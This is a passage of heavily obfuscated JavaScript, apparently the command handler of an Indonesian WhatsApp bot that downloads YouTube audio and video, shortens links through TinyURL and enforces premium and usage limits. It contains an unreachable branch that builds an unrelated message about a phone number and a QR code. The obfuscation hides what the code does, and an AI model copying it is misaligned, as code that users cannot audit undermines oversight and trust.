_0x59a7b0(_0x352ea6-0x40,_0x3abd49- -0x16c,_0x3abd49-0x13e,_0x11974b);}_0x1d3df2[_0x1b7caf(0x38d,0x715,0x2fe,0x50)](reply,_0x1d3df2[_0x1faa01(0x9f6,0x824,0x617,0x230)]);});});});}catch(_0x5d4ce6){reply(mess[_0x134458(0x64a,0x6b6,0x4f7,0x758)]['api']);}}await limitAdd(sender,limit);break;case _0x134458(0x759,0x740,0x521,0x960)+'d':{const _0x1f598a={};_0x1f598a[_0x134458(0x599,0x7ad,0x6e1,0x292)+'t']=_0x134458(0x806,0x485,0x3a5,0x6be)+'t';const _0x1a28fa={};_0x1a28fa[_0x134458(0xae0,0x735,0xc12,0xae7)]=_0x15af3d(0x950,0x9c9,0x953,0x730),_0x1a28fa[_0x134458(0x454,0x5d4,0x816,0x478)]=_0x1f598a,_0x1a28fa[_0x15af3d(0xa52,0x7ea,0x94b,0x86c)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x8db,0xcd1,0xda4)](prefix),'©\x20'+ownername,[_0x1a28fa]);const _0x57953f={};_0x57953f[_0x134458(0x599,0x4a3,0xa09,0x1fd)+'t']=_0x134458(0x45e,0x7a5,0x85a,0x707)+_0x134458(0xa5c,0x72f,0x95e,0xe75);const _0x6a7b86={};_0x6a7b86[_0x134458(0xae0,0x687,0xcbf,0x65f)]=_0x134458(0x65c,0x19e,0x882,0x32c),_0x6a7b86[_0x15af3d(0x5a7,0x6cf,0x4dc,0x8ac)]=_0x57953f,_0x6a7b86[_0x15af3d(0xa52,0xa56,0xcf4,0xe5d)]=0x1;const _0x49392c={};_0x49392c[_0x134458(0xadb,0xbcb,0x942,0x7db)]=mek;if(!isPremium)return sendButMessage(from,_0x15af3d(0x71d,0x464,0x9c1,0x967)+_0x134458(0x5ec,0xa07,0x7dd,0x15b)+_0x15af3d(0x50b,0x624,0x589,0x250)+'tuk\x20user\x20p'+'remium\x20saj'+_0x134458(0xb15,0x7e0,0xe8b,0xfcf)+'\x20akun\x20mu\x20s'+_0x134458(0x231,-0x18b,0x4bb,-0x1d1)+'ngan\x20cara\x20'+'ketik\x20'+prefix+'goprem',_0x15af3d(0x419,0x7ad,0x2da,0x184)+_0x15af3d(0x6c0,0xafc,0x499,0x9d4),[_0x6a7b86],_0x49392c);if(args[_0x134458(0x76b,0x807,0x2a0,0x7b2)]===-0x26f5+0x1842+-0x35*-0x47)return reply('Kirim\x20peri'+_0x134458(0x561,0x9b3,0x30d,0x3d1)+prefix+(_0x15af3d(0x9c8,0x8d2,0xd38,0x6b1)+_0x134458(0x8df,0x5df,0x7dc,0xa16)+'yang\x20akan\x20'+_0x134458(0x383,0x4e6,0x348,0x7d8)));var srch=args[_0x15af3d(0x309,0x680,0x522,0xff)]('');aramas=await yts(srch),server=_0x15af3d(0x5b2,0x7aa,0x7df,0x78e),aramat=aramas[_0x134458(0x8c4,0x401,0xbcf,0xb72)];var mulaikah=aramat[0x1*0xf55+-0x1821*0x1+-0x466*-0x2][_0x134458(0x307,0x8c,0x633,0x199)];try{ytv4(srch,server)['then'](_0x185573=>{const _0x4bfa30={'yUBIN':function(_0x31f6b2,_0x4f5117){return _0x31f6b2(_0x4f5117);},'OhsMR':'Emror','FJuua':function(_0x129f4b,_0x50572b){return _0x129f4b>=_0x50572b;},'nILan':function(_0x1a131b,_0x5054de,_0x2fcf48,_0x482281){return _0x1a131b(_0x5054de,_0x2fcf48,_0x482281);}};function _0x24e412(_0x270c0e,_0x514536,_0x57a768,_0x33a36d){return _0x15af3d(_0x33a36d- -0x1da,_0x514536-0x1e1,_0x514536,_0x33a36d-0x103);}function _0x127b8a(_0x59870a,_0x596a43,_0x50fff3,_0x1a8143){return _0x134458(_0x1a8143-0x1e9,_0x596a43-0x1dd,_0x50fff3,_0x1a8143-0x14c);}const {dl_link:_0x5b8e32,thumb:_0x3da2f4,title:_0x7d88f6,filesizeF:_0x41131d,filesize:_0x176de1}=_0x185573;axios[_0x127b8a(0xfe1,0xdf2,0xc87,0xb33)](_0x127b8a(0xead,0xc47,0x1033,0xca6)+_0x24e412(0x7c5,0x6a1,0xd4b,0x949)+'api-create'+'.php?url='+_0x5b8e32)[_0x24e412(0x302,0x2bb,0x35e,0x5a2)](async _0x58342e=>{const _0x4143b2={'vMBWJ':function(_0xa5a56,_0x132eca){function _0x1276ef(_0x32bcc6,_0x1ac701,_0x25f488,_0x3104b4){return _0x4ca6(_0x32bcc6- -0x231,_0x25f488);}return _0x4bfa30[_0x1276ef(0x4be,0x8ea,0x9d,0x50f)](_0xa5a56,_0x132eca);},'UPqSP':_0x4bfa30[_0x272062(0xc40,0x7f4,0xce7,0x3e7)]};function _0x272062(_0x1f363b,_0x13a5b9,_0x35738e,_0x1a66b1){return _0x127b8a(_0x1f363b-0x14b,_0x13a5b9-0x1a1,_0x35738e,_0x13a5b9- -0x200);}function _0x156b85(_0x46a72c,_0x17d9fd,_0x2467c0,_0xed3f68){return _0x127b8a(_0x46a72c-0x175,_0x17d9fd-0x117,_0x2467c0,_0x17d9fd-0x166);}if(_0x4bfa30[_0x156b85(0x97a,0xa6c,0x8ae,0x6bf)](_0x4bfa30['yUBIN'](Number,_0x176de1),-0x9ce1+-0x9840+-0x475*-0x9d))return _0x4bfa30[_0x156b85(0x91c,0x8b6,0x9e3,0x9b7)](sendMediaURL,from,_0x3da2f4,_0x156b85(0xccf,0xbde,0xf7b,0x813)+_0x272062(0xb7b,0x75c,0x536,0x591)+enter+enter+(_0x272062(-0xf1,0x33b,0x407,-0x125)+'*\x20')+_0x7d88f6+enter+('📊\x20*Quality'+_0x156b85(0x1156,0xe36,0x12ca,0x11e8)+'ps')+enter+(_0x156b85(0x60d,0x976,0x9b8,0x50e)+_0x272062(0x60f,0xa73,0x803,0xd86))+enter+(_0x156b85(0x6b6,0x91b,0x4c8,0x7a0)+_0x272062(0x67d,0x3ce,0x76c,0x69d))+_0x41131d+enter+(_0x272062(0x5b7,0xa6c,0xa9b,0x86a)+'\x20')+_0x58342e['data']+enter+enter+('_Untuk\x20dur'+_0x272062(0x54a,0x651,0x932,0x45b)+_0x156b85(0x69d,0xa7f,0xedc,0xb4b)+_0x272062(0xfd,0x5a7,0x759,0x79a)+_0x156b85(0xf09,0xbe6,0xce4,0xf6e)+'tuk\x20link_'));sendMediaURL(from,_0x5b8e32,'')[_0x272062(0xb57,0x6e8,0x5c9,0x801)](_0x1c2747=>{function _0x27f491(_0x47a47b,_0x52b9cd,_0x256015,_0x3f8a28){return _0x156b85(_0x47a47b-0xad,_0x47a47b- -0x441,_0x52b9cd,_0x3f8a28-0x1c5);}function _0x59f24c(_0x3073d1,_0x347335,_0x2df57e,_0x1fb9b9){return _0x156b85(_0x3073d1-0x12a,_0x347335- -0x125,_0x1fb9b9,_0x1fb9b9-0x18d);}_0x4143b2[_0x59f24c(0xbc2,0xb8e,0xcff,0xa5b)](reply,_0x4143b2[_0x27f491(0x90c,0xa70,0x623,0xc84)]);});});});}catch(_0x274396){reply(mess['error']['api']);}}break;case _0x134458(0x9a5,0x8e0,0x910,0xa87):{const _0x5dc887={};_0x5dc887['displayTex'+'t']=_0x15af3d(0x959,0x94a,0x804,0x9bf)+'t';const _0x20aabb={};_0x20aabb[_0x15af3d(0xc33,0x9e0,0xa6f,0xf9e)]=_0x15af3d(0x950,0x7e3,0xe3e,0x6d7),_0x20aabb[_0x134458(0x454,0x74c,0x469,0x24b)]=_0x5dc887,_0x20aabb[_0x15af3d(0xa52,0x8f1,0x880,0xa9b)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xe09,0x666,0xa59)](prefix),'©\x20'+ownername,[_0x20aabb]);if(args[_0x15af3d(0x8be,0x96c,0xccd,0x795)]===0x111a+-0x2*0xce5+0x8b0)return reply('Kirim\x20peri'+_0x15af3d(0x6b4,0xad9,0x66e,0x50a)+prefix+(_0x134458(0x875,0x9ac,0x514,0x6b1)+_0x134458(0x8df,0xbce,0x7a1,0xdd3)+'yang\x20akan\x20'+_0x15af3d(0x4d6,0x46,0x353,0x384)));var srch=args[_0x15af3d(0x309,0x11e,0x363,0x2de)]('');aramas=await yts(srch),server='en68',aramat=aramas['all'];var mulaikah=aramat[-0x82e+-0x11e2+0x8b0*0x3]['url'];try{ytv2(srch,server)['then'](_0x189569=>{function _0x3d04d4(_0x5defce,_0x45a923,_0x5255ad,_0x5e512f){return _0x15af3d(_0x5e512f- -0x475,_0x45a923-0x11a,_0x5defce,_0x5e512f-0x171);}const _0x381df7={'iAECz':_0x29ac9c(0x11e,0x19,0x263,0x25)+_0x3d04d4(0x6fa,-0x177,0x512,0x271),'neOoj':_0x29ac9c(0x1d6,0x358,0x1f3,0x7d8)+_0x29ac9c(0x53b,0x28e,0x39a,0x77a)+']','FEDuc':function(_0x64913d,_0x5d9b62){return _0x64913d(_0x5d9b62);},'jJaKp':_0x3d04d4(0x57a,0x42e,-0x2cc,0xb1)+_0x29ac9c(0x913,0x921,0x737,0xd42),'OgeAH':_0x29ac9c(0x2ac,0x37a,0x2ad,0x34)+'21','wXyJv':function(_0x4e442a,_0x1f7198){return _0x4e442a!==_0x1f7198;},'MZKWc':'kdbsa','MSlLZ':function(_0x50621a,_0x3e8a42){return _0x50621a>=_0x3e8a42;},'AJOJS':function(_0x2ac321,_0x18410d,_0x583c72,_0x2c5fb4){return _0x2ac321(_0x18410d,_0x583c72,_0x2c5fb4);},'gbJVh':_0x3d04d4(0x4e4,0xa08,0x60b,0x7ca)+'utu.be/1r_'+_0x3d04d4(0x40a,0x151,0xad4,0x61b),'PcmKM':_0x29ac9c(0x536,0x698,0x58c,0x97f)};function _0x29ac9c(_0x12e396,_0x5878f3,_0x129bc4,_0x49e350){return _0x15af3d(_0x5878f3- -0x2c3,_0x5878f3-0x46,_0x12e396,_0x49e350-0x58);}const {dl_link:_0x26ded5,thumb:_0x2a04e5,title:_0x43114d,filesizeF:_0x16d8c8,filesize:_0x327995}=_0x189569;axios[_0x3d04d4(0x401,0x3d6,0x65f,0x628)](_0x29ac9c(0xaa2,0x94d,0xbf0,0x996)+_0x29ac9c(0x6ac,0x860,0xaa5,0x5e2)+_0x29ac9c(0x13e,0x484,0x602,0x5b9)+_0x29ac9c(0xb86,0x81e,0xc2b,0x47c)+_0x26ded5)[_0x3d04d4(-0x1a4,0x24f,0x463,0x307)](async _0x400fcf=>{function _0x48f8a2(_0xb93061,_0x2d63af,_0xfda4e5,_0x53501c){return _0x29ac9c(_0xb93061,_0x2d63af-0x4ea,_0xfda4e5-0x83,_0x53501c-0xb4);}const _0x472616={'LJEMM':_0x381df7['iAECz'],'fwuXF':_0x381df7[_0x48f8a2(0x7d4,0x948,0x8ae,0xa53)],'GIXxH':function(_0x221b65,_0x5d451c){function _0x2c6898(_0x280ae9,_0x5f0446,_0x5eaa85,_0x452a36){return _0x48f8a2(_0x5eaa85,_0x280ae9- -0x54e,_0x5eaa85-0x40,_0x452a36-0x9e);}return _0x381df7[_0x2c6898(0x20,0x346,0x1e4,0x10c)](_0x221b65,_0x5d451c);},'cyorC':_0x48f8a2(0xf52,0xc52,0x1006,0x8a8)+_0x48f8a2(0x3d0,0x736,0x2a3,0x6b6)+_0x1c448f(0xc2a,0xd2e,0x845,0xb0b),'rbBWf':_0x381df7[_0x1c448f(0xe7b,0xd40,0xc98,0xc7b)],'atccY':_0x1c448f(0x1ce,0x442,0x886,0x68f),'HCKWr':_0x381df7[_0x1c448f(0x69a,0x464,0xb35,0x7bd)]};function _0x1c448f(_0x5a52f2,_0x367903,_0x1138fb,_0x20ef97){return _0x29ac9c(_0x5a52f2,_0x20ef97-0x4ef,_0x1138fb-0x1ac,_0x20ef97-0x125);}if(_0x381df7[_0x48f8a2(0x2ff,0x731,0x5fe,0x5ec)](_0x381df7[_0x48f8a2(0xf42,0xcfb,0xd20,0xa8b)],_0x381df7['MZKWc'])){_0x1d7067[_0x1c448f(0xa06,0xf6f,0x11fb,0xdc6)](_0x472616[_0x1c448f(0xce9,0x9f6,0x97d,0xcb2)],_0x472616['fwuXF'],_0x50f5ed,_0x472616['GIXxH'](_0x63b625,_0x472616[_0x1c448f(0xf2a,0xf91,0x9a6,0xd83)]));var _0x55c5dd=_0x1c448f(0x40e,0xbc6,0x2d9,0x799)+_0x3a9332['split']('@')[0xac9+-0x1e2*-0x2+0x1*-0xe8d]+(_0x48f8a2(0x689,0x9fa,0x816,0x8ec)+_0x1c448f(0xe91,0xe0a,0xcc1,0xcda)+'e\x20nomor\x20aj'+_0x48f8a2(0x8da,0xdb1,0xf24,0x976)+'e\x20qr\x20code?');const _0xf268fc={};_0xf268fc[_0x48f8a2(0xc91,0xe5a,0x10ea,0x9a2)]=_0x472616[_0x1c448f(0x81f,0x5a3,0x12a,0x4db)],_0xf268fc[_0x48f8a2(0x46b,0x7ce,0x6ad,0x423)]={},_0xf268fc['type']=0x1,_0xf268fc[_0x48f8a2(0x46b,0x7ce,0x6ad,0x423)][_0x48f8a2(0x5a8,0x913,0xae6,0x56f)+'t']=_0x472616[_0x48f8a2(0x881,0x625,0x43b,0xa12)];const _0x3dfc55={};_0x3dfc55[_0x1c448f(0x9f9,0xde1,0xb9c,0x918)+'t']=_0x1c448f(0xc1a,0x1166,0x9f0,0xdf2);const _0xcf9d14={};_0xcf9d14[_0x1c448f(0xb08,0xd0d,0xf32,0xe5f)]=_0x48f8a2(0x8be,0x511,0x276,0x291),_0xcf9d14[_0x1c448f(0x7cb,0x7aa,0xa1f,0x7d3)]=_0x3dfc55,_0xcf9d14[_0x1c448f(0xa3d,0xfec,0xaac,0xc7e)]=0x1;const _0x5e31c4=[_0xf268fc,_0xcf9d14],_0x4bc20a={};_0x4bc20a[_0x48f8a2(0xd1a,0xb71,0xd0f,0xec5)+'t']=_0x55c5dd,_0x4bc20a[_0x1c448f(0xd79,0x9fd,0x115c,0xd31)]=''+_0x34e951+_0x3639a2+_0x481867+_0x5bc6ce+'©\x20'+_0x99fb7e,_0x4bc20a[_0x48f8a2(0x29a,0x69b,0x8a5,0x783)]=_0x5e31c4,_0x4bc20a['headerType']=0x1;const _0x5ce4e9=_0x4bc20a,_0x233c2e={};_0x233c2e['text']='hi',_0x233c2e[_0x1c448f(0xde1,0xec5,0xee3,0xb1d)+_0x1c448f(0x9f7,0xe48,0xcf6,0xe30)]=0x3b9aca00,_0x233c2e[_0x48f8a2(0x2ee,0x7af,0x564,0x6c6)+'d']=!![],_0x233c2e[_0x48f8a2(0x6c3,0x851,0x42f,0xc73)+_0x48f8a2(0x92b,0x7f1,0x946,0xcaf)]=!![],_0x233c2e[_0x48f8a2(0x45e,0x77d,0x65f,0x3ca)+'id']=[_0x71b98e];const _0x54bce0={};_0x54bce0[_0x1c448f(0xbe8,0x78b,0x901,0x76c)]=_0x472616['HCKWr'],_0x54bce0[_0x1c448f(0xbb6,0xd46,0x11b7,0xce7)+'o']=_0x233c2e,_0x54bce0[_0x1c448f(0xbfe,0xe9f,0x12de,0xe5a)]=_0x3120fa,_0x54bce0['sendEpheme'+_0x48f8a2(0x73c,0x7f1,0x9fb,0xbcd)]=!![],_0x52f5cf[_0x48f8a2(0xa8f,0xcfc,0x1122,0x10be)+'e'](_0x4168cc,_0x5ce4e9,_0x2a5170['buttonsMes'+'sage'],_0x54bce0);}else{if(_0x381df7[_0x48f8a2(0x87b,0x6ce,0x320,0xa57)](_0x381df7[_0x1c448f(0x42e,0x855,0x477,0x573)](Number,_0x327995),0x18df9+-0x79d*-0x4f+-0x260cc))return _0x381df7['AJOJS'](sendMediaURL,from,_0x2a04e5,'*📽️\x20YOUTUBE'+'-PLAY\x20MP4*'+'*'+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x43114d+enter+(_0x48f8a2(0x9d0,0x9a1,0xa39,0x7c5)+_0x48f8a2(0xbbc,0xe04,0x1241,0xac3))+enter+('🐭\x20*Filesiz'+_0x48f8a2(0x6aa,0x75f,0xc12,0x482))+_0x16d8c8+enter+(_0x1c448f(0x1255,0x938,0xfe5,0xe02)+'\x20')+_0x400fcf[_0x48f8a2(0x9a3,0x566,0x3c9,0x5db)]+enter+enter+(_0x1c448f(0x575,0xa31,0x57b,0x65e)+_0x1c448f(0x6ff,0x56f,0x7c9,0x9e7)+_0x1c448f(0x6bc,0x73f,0xec1,0xaaf)+_0x48f8a2(0xce2,0x938,0xa01,0x6ab)+_0x1c448f(0xd1f,0xf0b,0x10f4,0xc16)+_0x1c448f(0x347,0x509,0xa6c,0x805)));let _0x54a377=await _0x381df7[_0x48f8a2(0x865,0x56e,0x294,0x370)](getBuffer,_0x26ded5);const _0x463b6e={};_0x463b6e['mediaUrl']=_0x381df7[_0x48f8a2(0x659,0x93f,0x759,0xbae)],_0x463b6e[_0x1c448f(0x8d0,0x2e7,0x732,0x60f)]=0x2,_0x463b6e[_0x48f8a2(0xa42,0x87c,0xba0,0x47e)]=_0x1c448f(0xd98,0xd18,0xe6a,0xcdd)+'4',_0x463b6e[_0x48f8a2(0x460,0x538,0x79a,0x27f)]='',_0x463b6e[_0x1c448f(0xb62,0xc93,0x8a3,0xa54)+'rl']='',_0x463b6e[_0x1c448f(0x60a,0x388,0x86c,0x832)]=pp_userz;const _0x462810={};_0x462810[_0x1c448f(0xc4d,0x6fe,0xff2,0xb1d)+_0x48f8a2(0x1121,0xe2b,0x10a5,0xce8)]=0x3b9aca00,_0x462810[_0x48f8a2(0x2d7,0x7af,0x8ce,0x392)+'d']=!![],_0x462810['sendEpheme'+_0x48f8a2(0x49f,0x7f1,0x66c,0x7b1)]=!![],_0x462810[_0x48f8a2(0x5b0,0x8fb,0x435,0x518)+'Reply']=_0x463b6e;const _0x5480b7={};_0x5480b7['contextInf'+'o']=_0x462810,_0x5480b7[_0x48f8a2(0xc08,0xdeb,0xea4,0xa86)]=_0x381df7[_0x1c448f(0x765,0x721,0x78b,0xb98)],_0x5480b7['filename']=_0x43114d+_0x1c448f(0xb6e,0x823,0x6f5,0xbea),_0x5480b7[_0x48f8a2(0x1072,0xe55,0xe9a,0x1070)]=fgclink2,_0x5480b7[_0x1c448f(0x870,0xb32,0x9f9,0x832)]=pp_bot2,alpha[_0x48f8a2(0xf4f,0xcfc,0xfdb,0xe25)+'e'](from,_0x54a377,MessageType[_0x48f8a2(0xcc3,0x9ba,0x932,0xc4f)],_0x5480b7);}});});}catch(_0x2e9bae){reply(mess[_0x15af3d(0x79d,0x8da,0x6ce,0x377)][_0x15af3d(0x759,0x406,0xb79,0xc48)]);}}await limitAdd(sender,limit);break;case'ytmp3aja':const _0x4c0a9a={};_0x4c0a9a['displayTex'+'t']=_0x134458(0x806,0x6f9,0x80c,0x814)+'t';const _0x46a125={};_0x46a125[_0x134458(0xae0,0xf37,0x955,0xa3d)]=_0x134458(0x7fd,0xbca,0x9b4,0xb88),_0x46a125[_0x15af3d(0x5a7,0x91c,0x4b3,0x9f3)]=_0x4c0a9a,_0x46a125[_0x134458(0x8ff,0x8ce,0xaf0,0x708)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xc9e,0xaa7,0x7ee)](prefix),'©\x20'+ownername,[_0x46a125]);try{reply(lang[_0x134458(0x279,0x20d,0x312,-0x130)]());let ksjz=q,yut=await yts(ksjz);yta(ksjz)[_0x134458(0x629,0x64f,0xa3c,0x255)](_0x9c9988=>{function _0x30337c(_0x20ecbb,_0x53952e,_0x3b041e,_0x46e366){return _0x134458(_0x3b041e-0x6c,_0x53952e-0x110,_0x20ecbb,_0x46e366-0xb6);}const _0x412035={'Pzsuf':function(_0x32dfbe,_0x32e705){return _0x32dfbe(_0x32e705);},'hVBRT':_0x5d6f21(0x2ad,0x6f,0x128,-0x486),'mjcVR':function(_0x432f1c,_0xacc581){return _0x432f1c>=_0xacc581;},'MdVig':function(_0x142f9a,_0x5c3ad3,_0x283705,_0x4ae00){return _0x142f9a(_0x5c3ad3,_0x283705,_0x4ae00);}},{dl_link:_0x1aae96,thumb:_0xef0225,title:_0x3014d9,filesizeF:_0x2e5806,filesize:_0x17eb02}=_0x9c9988;function _0x5d6f21(_0x4adc78,_0x255825,_0xa8b7a7,_0x9270ef){return _0x134458(_0x255825- -0x14c,_0x255825-0xac,_0x9270ef,_0x9270ef-0xf6);}axios[_0x5d6f21(0x83b,0x7fe,0x579,0xcf1)]('https://ti'+'nyurl.com/'+_0x30337c(0x1d5,0x896,0x660,0x6be)+_0x30337c(0xa8a,0xb05,0x9fa,0xada)+_0x1aae96)[_0x5d6f21(0x70b,0x4dd,0x357,0x56e)](async _0x9e4ea8=>{if(_0x412035[_0xa8062(0x364,0x8c6,0x603,0x50c)](_0x412035[_0xa8062(0x693,0x254,0x860,0x5f4)](Number,_0x17eb02),-0x1a*-0x283+-0x1*-0x8db5+-0x3f*0x16d))return sendMediaURL(from,_0xef0225,'*🎧\x20P\x20L\x20A\x20Y'+_0xa8062(0x7b7,0x467,0x594,0x42a)+_0xa8062(0x4ea,0x219,0x663,0x466)+_0x3014d9+(_0xa8062(0x8a2,0x83b,0x676,0x99e)+_0xa8062(0x4cc,0x5b4,0xd7f,0x8e3))+yut[_0xa8062(0x444,0x58c,0x3f1,0x843)][-0x1*0x243d+0x1a*0x45+0x7*0x42d][_0xa8062(0x5a9,0x91a,0x5df,0x846)]+(_0x330779(0x1c9,0x326,0xbf,0x1f7)+':\x20')+yut[_0x330779(-0xee,0x541,0x331,0x52d)][-0x16*-0xfa+0xc89*0x1+-0x2205]['ago']+(_0xa8062(-0x1d9,0x46f,0x266,0x2ee)+'\x20')+_0x2e5806+_0xa8062(0xbe8,0xa08,0xa37,0xb1b)+yut[_0xa8062(0x4ad,0xb28,0x3a6,0x843)][-0x790+-0xb9+0x849][_0x330779(-0x3a7,0x490,0x32,-0x3a4)]+(_0xa8062(0x828,0x9d3,0x5da,0x69a)+'on\x20:\x20')+yut[_0x330779(0x197,0x6ef,0x331,0x4ce)][-0xe11+-0x2215+0x3026][_0x330779(-0x1cf,-0x2b9,0x1c5,-0xbd)]+_0xa8062(0xd31,0xe8b,0x858,0xc12)+yut[_0x330779(0x2b4,0x767,0x331,0x704)][-0x945+0x12*-0xfc+0x8d*0x31][_0xa8062(0x1ab,0x2b7,0x35e,0x474)]+('\x0a\x0a_For\x20the'+_0xa8062(0xa29,0x773,0x716,0x868)+_0x330779(-0x3ff,-0x540,-0x238,0x24d)+_0x330779(0x47f,0x922,0x625,0x1b0)+'it\x20is\x20pres'+_0xa8062(0x769,0x24c,0x582,0x35e)+_0xa8062(0xd5c,0xa40,0x852,0xa07)+'\x20a\x20link_'));function _0xa8062(_0x38006e,_0xedc4b1,_0x1aee3a,_0x7b6caa){return _0x5d6f21(_0x38006e-0x1e1,_0x7b6caa-0x2b9,_0x1aee3a-0x11a,_0x38006e);}function _0x330779(_0x5eab11,_0x91a426,_0x5cf983,_0x79c5ee){return _0x30337c(_0x5eab11,_0x91a426-0x95,_0x5cf983- -0x411,_0x79c5ee-0x10b);}_0x412035[_0xa8062(0x9a3,0x37c,0x90c,0x55e)](sendMediaURL,from,_0x1aae96,'')['catch'](_0x7fb42b=>{function _0x291b2b(_0x4bf292,_0x152854,_0x2dc9e8,_0x282bfa){return _0xa8062(_0x152854,_0x152854-0xbd,_0x2dc9e8-0xac,_0x282bfa- -0x1ec);}function _0x40fbd1(_0x5acbdb,_0x380e31,_0x2f034d,_0x54ecb8){return _0xa8062(_0x5acbdb,_0x380e31-0x1c9,_0x2f034d-0xaf,_0x380e31- -0x2eb);}_0x412035[_0x40fbd1(0xf,0x309,0x707,0x95)](reply,_0x412035[_0x291b2b(0x732,0x6ea,0x76f,0x66d)]);});});})[_0x134458(0x6ff,0xb65,0x846,0x337)](_0x40ecac=>reply(''+_0x40ecac));}catch(_0x4b10c6){console[_0x134458(0xa47,0xe3d,0xa81,0xd68)](color('[PlayMp3]',_0x15af3d(0x41a,0x759,0x6b3,0x161)),_0x4b10c6);}await limitAdd(sender,limit);break;case _0x134458(0x220,0x522,-0x1b9,0x21a):const _0x3a150f={};_0x3a150f[_0x134458(0x599,0x38f,0x734,0x9e7)+'t']=_0x15af3d(0x959,0xcbf,0x5ac,0xe21)+'t';const _0x45315c={};_0x45315c[_0x15af3d(0xc33,0xa66,0xa04,0xc02)]=_0x134458(0x7fd,0x808,0x8fb,0xa3f),_0x45315c[_0x134458(0x454,-0x4e,0x174,0x584)]=_0x3a150f,_0x45315c[_0x134458(0x8ff,0x95d,0x54d,0x6fc)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x84c,0x5ca,0x61b)](prefix),'©\x20'+ownername,[_0x45315c]);try{reply(lang[_0x15af3d(0x3cc,0x852,0x34f,0x366)]());let ksjjz=q,yut=await yts(ksjjz);yta(ksjjz)[_0x134458(0x629,0x681,0x77b,0x61e)](_0x523262=>{function _0x1e0741(_0x1cf56d,_0xb98bf8,_0x69d203,_0x2b8b7e){return _0x134458(_0xb98bf8-0x2bd,_0xb98bf8-0xf7,_0x1cf56d,_0x2b8b7e-0x84);}function _0x10d8b5(_0x4cd796,_0x5a6460,_0xd40d55,_0xd57df){return _0x134458(_0xd57df- -0x38a,_0x5a6460-0x99,_0x5a6460,_0xd57df-0x1e);}const _0x5b5df5={'ckAcu':function(_0x3485e7,_0x2a571a){return _0x3485e7(_0x2a571a);},'bqlzK':function(_0x9926d0,_0x108c70,_0x283cb4,_0x564519){return _0x9926d0(_0x108c70,_0x283cb4,_0x564519);},'SoHNn':_0x1e0741(0xc77,0xda9,0xb83,0x9bd)+_0x10d8b5(0x8ac,0x271,0x51b,0x5d9)+'xTH6oLd8','sCVQa':_0x1e0741(0xf4c,0xb43,0xfa5,0x75d)},{dl_link:_0x55ba8d,thumb:_0x20a925,title:_0x4cae0d,filesizeF:_0x577d66,filesize:_0x501700}=_0x523262;axios[_0x1e0741(0x10d5,0xc07,0xe9d,0x1069)](_0x10d8b5(0x62d,0x70e,0x86b,0x733)+_0x1e0741(0xf5e,0xc8d,0xa0e,0x1175)+'api-create'+'.php?url='+_0x55ba8d)[_0x10d8b5(0x767,0x379,0x36d,0x29f)](async _0x30b1db=>{if(_0x5b5df5['ckAcu'](Number,_0x501700)>=0x694c+0x10*-0x52+-0x1104*-0x1)return _0x5b5df5[_0x3d6917(0x18d,0x25b,0x1f3,0x3c2)](sendMediaURL,from,_0x20a925,'*🎧\x20P\x20L\x20A\x20Y'+_0x3f8ecc(0x6a0,0x8f8,0x3bc,0x466)+_0x3d6917(0x29f,0x3dc,-0x239,0xdb)+_0x4cae0d+(_0x3d6917(0x7d7,0x7f0,0x55c,0x626)+'P3\x0a🤠\x20ID\x20:\x20')+yut['videos'][0x650+0x268c+-0x2cdc]['videoId']+('\x0a🐣\x20Upload\x20'+':\x20')+yut['videos'][0xa9a+0x1c45*-0x1+0x11ab*0x1]['ago']+(_0x3f8ecc(0x564,0x6a5,0x796,0x98b)+'\x20')+_0x577d66+_0x3d6917(0x954,0x734,0xa9b,0x834)+yut[_0x3f8ecc(0xab9,0x922,0x887,0x7fa)][0x1*0x2c5+0x21*-0x50+-0x1*-0x78b][_0x3f8ecc(0x7ba,0x822,0x849,0x8d8)]+(_0x3f8ecc(0x910,0x4c0,0x8a2,0x463)+_0x3f8ecc(0x70a,0xa64,0xa61,0x489))+yut['videos'][0x17d7*-0x1+-0x1e65*-0x1+0x347*-0x2][_0x3f8ecc(0x94d,0x64f,0xbfc,0xaf2)]+_0x3d6917(0xa4b,0xf39,0x579,0xe7c)+yut['videos'][-0xcbc+-0x50a+-0xe*-0x145][_0x3f8ecc(0x6ea,0x73c,0x863,0x225)]+(_0x3f8ecc(0x548,0x8c1,0x397,0x4d9)+_0x3d6917(0x6a1,0x5a5,0x6a5,0x3d1)+_0x3d6917(0x113,-0x7b,-0x366,0x526)+_0x3f8ecc(0xdad,0xd27,0xa0e,0x911)+_0x3f8ecc(0xe6f,0xd0f,0x1220,0xe68)+_0x3f8ecc(0x5d4,0xa5f,0x1dd,0x676)+_0x3d6917(0x840,0xa49,0x5b4,0x495)+_0x3f8ecc(0xd3d,0xb54,0xe90,0xb4e)));let _0x1cec10=await getBuffer(_0x55ba8d);const _0x1a0e6e={};_0x1a0e6e[_0x3f8ecc(0xa03,0x7a2,0xd21,0x6cc)]=_0x5b5df5['SoHNn'],_0x1a0e6e[_0x3d6917(0x236,0x55a,0x358,0x385)]=0x2,_0x1a0e6e['title']=_0x3d6917(0x904,0x791,0xd8c,0x653)+'3',_0x1a0e6e[_0x3d6917(0x164,0x3e0,-0x365,0x259)]='',_0x1a0e6e[_0x3d6917(0x67b,0x475,0x273,0x645)+'rl']='';function _0x3d6917(_0x2e04bd,_0x45b983,_0x5dcbd8,_0xb02a20){return _0x1e0741(_0x45b983,_0x2e04bd- -0x317,_0x5dcbd8-0xe9,_0xb02a20-0x1f3);}_0x1a0e6e[_0x3d6917(0x459,0x1d4,0x250,0xb8)]=pp_userz;function _0x3f8ecc(_0x19f582,_0x4e35ac,_0xd233ac,_0xbb706c){return _0x1e0741(_0x4e35ac,_0x19f582-0x126,_0xd233ac-0x15f,_0xbb706c-0x132);}const 